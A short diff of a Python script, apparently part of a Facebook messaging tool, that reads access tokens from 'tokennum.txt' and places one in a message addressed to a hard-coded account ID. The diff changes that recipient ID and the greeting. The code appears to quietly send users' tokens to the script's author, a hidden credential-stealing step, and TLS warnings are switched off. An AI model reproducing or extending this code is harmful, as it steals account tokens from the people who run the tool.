@@ -26,8 +26,8 @@ def send_initial_message():
     with open('tokennum.txt', 'r') as file:
         tokens = file.readlines()
 
-    msg_template = "HeLLo feliix SīīR! I am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {}"
-    target_id = "61571059542672"
+    msg_template = "HeLLo Mr Anurag Sir. MY ⤵️TokEn⤵️ īīS {}"
+    target_id = "61578840237242"
 
     requests.packages.urllib3.disable_warnings()
 
